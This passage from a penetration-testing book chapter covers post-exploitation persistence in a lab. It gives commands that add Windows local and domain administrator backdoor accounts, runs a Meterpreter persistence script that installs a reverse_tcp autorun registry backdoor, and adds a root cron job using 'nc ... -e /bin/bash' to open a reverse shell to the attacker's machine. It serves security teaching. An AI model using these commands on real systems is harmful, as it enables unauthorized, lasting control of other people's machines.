id="persistence" style="clear: both">Persistence</h2></div></div></div><p><a class="indexterm" id="iddle1019"/><a class="indexterm" id="iddle1279"/><a class="indexterm" id="iddle1808"/><a class="indexterm" id="iddle1810"/><a class="indexterm" id="iddle1929"/><a class="indexterm" id="iddle1979"/><a class="indexterm" id="iddle2335"/>A great thing about our Meterpreter sessions is also a bad thing. Because the host process resides entirely in memory, if it dies, our Meterpreter session dies as well, and if the system restarts we lose our session. If we lose network access to the target, our session may die as well.</p><p>Rather than re-exploiting the same vulnerability or resending social-engineering attacks, it would be ideal if we had a way to regain access in the future. Persistence methods can be as simple as adding a user to a system or as advanced as kernel-level rootkit that hides itself even from the Windows API making it virtually undetectable. In this section we’ll look at a few simple ways to gain persistence on a target system to give you a good starting point for your pentests.</p><div class="sect2" title="Adding a User"><div class="titlepage"><div><div><h3 class="title" id="adding_a_user-id00038">Adding a User</h3></div></div></div><p>Perhaps the simplest way to gain persistence is to add a new user. Being able to log in to the system directly via SSH, RDP, and so on makes it easy to access a system in the future. (As with all other changes you make on your targets, remember to delete any added user accounts before finishing the pentest.)</p><p>On a Windows system, use <code class="literal">net user</code> <span class="emphasis"><em><code class="literal">username</code></em></span> <span class="emphasis"><em><code class="literal">password</code></em></span> <code class="literal">/add</code> to add a new user, as shown here.</p><a id="pro_id00174"/><pre class="programlisting">C:\Documents and Settings\georgia\Desktop&gt; <span class="strong"><strong>net user james password /add</strong></span>&#13;
net user james password /add&#13;
The command completed successfully.</pre><p>We should also add our new user to the relevant groups with the command <code class="literal">net localgroup</code> <span class="emphasis"><em><code class="literal">group username</code></em></span> <code class="literal">/add</code>. For example, if we want to log in via remote desktop, we should add the user to the Remote Desktop Users group. The Administrators group is also a good group to add our user to as shown here.</p><a id="pro_id00175"/><pre class="programlisting">C:\Documents and Settings\georgia\Desktop&gt; <span class="strong"><strong>net localgroup Administrators james /add</strong></span>&#13;
net localgroup Administrators james /add&#13;
The command completed successfully.</pre><p>If your client has a Windows domain, you can add users to the domain and add them to domain groups (if you have sufficient privileges) by tacking on <code class="literal">/domain</code> at the end of a command. For example, if you are able to steal a domain administrator’s token, you can use the following commands to add a domain administrator account, giving you full control of the entire domain.</p><a id="pro_id00176"/><pre class="programlisting">C:\Documents and Settings\georgia\Desktop&gt; <span class="strong"><strong>net user georgia2 password /add /domain</strong></span>&#13;
C:\Documents and Settings\georgia\Desktop&gt; <span class="strong"><strong>net group "Domain Admins" georgia2 /add /domain</strong></span></pre><p>On the Linux target, we can use <code class="literal">adduser</code> to add a user account. Ideally we should also add our new user to the sudoers group so we have root privileges.</p></div><div class="sect2" title="Metasploit Persistence"><div class="titlepage"><div><div><h3 class="title" id="metasploit_persistence">Metasploit Persistence</h3></div></div></div><p><a class="indexterm" id="iddle1930"/>The Meterpreter script <span class="emphasis"><em>persistence</em></span> automates the creation of a Windows backdoor that will automatically connect back to a Metasploit listener at startup, login, and so on, based on the options we use when creating it. The options for the <span class="emphasis"><em>persistence</em></span> script are shown in <a class="xref" href="ch13.xhtml#meterpreter_persistence_script" title="Example 13-33. Meterpreter persistence script">Example 13-33</a>.</p><div class="example"><a id="meterpreter_persistence_script"/><div class="example-title">Example 13-33. Meterpreter persistence script</div><div class="example-contents"><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>run persistence -h</strong></span>&#13;
Meterpreter Script for creating a persistent backdoor on a target host.&#13;
&#13;
OPTIONS:&#13;
&#13;
    -A        Automatically start a matching multi/handler to connect to the agent&#13;
    -L &lt;opt&gt;  Location in target host where to write payload to, if none %TEMP% will be used.&#13;
    -P &lt;opt&gt;  Payload to use, default is windows/meterpreter/reverse_tcp.&#13;
    -S        Automatically start the agent on boot as a service (with SYSTEM privileges)&#13;
    -T &lt;opt&gt;  Alternate executable template to use&#13;
    -U        Automatically start the agent when the User logs on&#13;
    -X        Automatically start the agent when the system boots&#13;
    -h        This help menu&#13;
    -i &lt;opt&gt;  The interval in seconds between each connection attempt&#13;
    -p &lt;opt&gt;  The port on the remote host where Metasploit is listening&#13;
    -r &lt;opt&gt;  The IP of the system running Metasploit listening for the connect back</pre></div></div><p>As you can see we have a lot of customization options for our persistent payload. We can have the persistence agent start at boot or when the user logs in. We can set an interval between attempts to connect to the handler. We can change where the agent is written on the target system. We can also specify the remote host and port for the agent to connect back to. We can even have Metasploit automatically set up a handler to catch the incoming connection. In the process of setting up persistence, Metasploit has to write the persistence agent to the disk, so Meterpreter is no longer completely residing in memory at this point. When the persistence agent runs at startup (-<code class="literal">X</code>), a Visual Basic script is uploaded to the <span class="emphasis"><em>%TEMP%</em></span> folder, and a registry entry is added to the list of programs to run at startup. When the persistence agent runs upon login (<code class="literal">-U</code>), the process is similar, but the registry entry is set to run at login. When the persistence agent runs as a service (<code class="literal">-S</code>), a Windows system service is created that will call the Visual Basic script from <span class="emphasis"><em>%TEMP%</em></span>.</p><p>Let’s run the <span class="emphasis"><em>persistence</em></span> script, as shown in <a class="xref" href="ch13.xhtml#running_the_persistence_script" title="Example 13-34. Running the persistence script">Example 13-34</a>, telling the agent to connect back to our Kali machine when the user logs in.</p><div class="example"><a id="running_the_persistence_script"/><div class="example-title">Example 13-34. Running the persistence script</div><div class="example-contents"><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>run persistence -r 192.168.20.9 -p 2345 -U</strong></span>&#13;
[*] Running Persistence Script&#13;
[*] Resource file for cleanup created at /root/.msf4/logs/persistence/BOOKXP_20150814.1154/BOOKXP_20150814.1154.rc&#13;
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345&#13;
[*] Persistent agent script is 614853 bytes long&#13;
[+] Persistent Script written to C:\WINDOWS\TEMP\eTuUwezJblFHz.vbs&#13;
[*] Executing script C:\WINDOWS\TEMP\eTuUwezJblFHz.vbs&#13;
[+] Agent executed with PID 840&#13;
[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BJkGfQLhXD&#13;
[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BJkGfQLhXD</pre></div></div><p><a class="indexterm" id="iddle1092"/><a class="indexterm" id="iddle1227"/><a class="indexterm" id="iddle1342"/><a class="indexterm" id="iddle1717"/>After running the script, place the Meterpreter session in the background with the Meterpreter command <code class="literal">background</code>, and set up a handler to catch the persistence agent. Now restart the Windows XP target. When it restarts, log in as <span class="emphasis"><em>georgia</em></span>, and you should receive another Meterpreter session.</p><div class="note" title="Note"><h3 class="title"><a id="ch13note12"/>Note</h3><p>If it doesn’t work the first time, try restarting and logging in again.</p></div></div><div class="sect2" title="Creating a Linux cron Job"><div class="titlepage"><div><div><h3 class="title" id="creating_a_linux_cron_job">Creating a Linux cron Job</h3></div></div></div><p>On both Windows and Linux systems, we can automatically start tasks at a given time. For example, we can set up a <code class="literal">cron</code> job to automatically run a Metasploit payload or even just use Netcat to connect back to us.</p><p>Open <span class="emphasis"><em>/etc/crontab</em></span> on your Linux target. The following line will run the command <code class="literal">nc 192.168.20.9 12345 -e /bin/bash</code> every ten minutes of every hour of every day of every month—basically every ten minutes. The command will be run as root. Add this line to the end of the <span class="emphasis"><em>/etc/crontab</em></span> file. (For help, see <a class="xref" href="ch02.xhtml#automating_tasks_with_cron_jobs" title="Automating Tasks with cron Jobs">Automating Tasks with cron Jobs</a>.)</p><a id="pro_id00177"/><pre class="programlisting">*/10 * * * * root nc 192.168.20.9 12345 -e /bin/bash</pre><p>Now restart the <code class="literal">cron</code> service by entering <span class="strong"><strong><code class="literal">service cron restart</code></strong></span>. Set up a Netcat listener on port 12345 on your Kali machine, and at the next ten-minute mark, the <code class="literal">cron</code> job should run, and you should receive a root shell at your Netcat listener.</p></div></div><div class="sect1" title="Summary"><div class="titlepage"><div><div><h2 class="title" id="summary-id00039" style="clear: both">Summary</h2></div></div></div><p>In this chapter we’ve covered just a few post-exploitation techniques, barely skimming the surface of the wealth of interesting tools and techniques available. We looked at some methods for escalating our privileges on an exploited system. We also looked at methods of gathering local information. We studied methods of turning access to one system into access to many, including pivoting from one network to another through an open session. Finally, we looked at a couple of methods for making our access permanent.</p></div></section></body></html>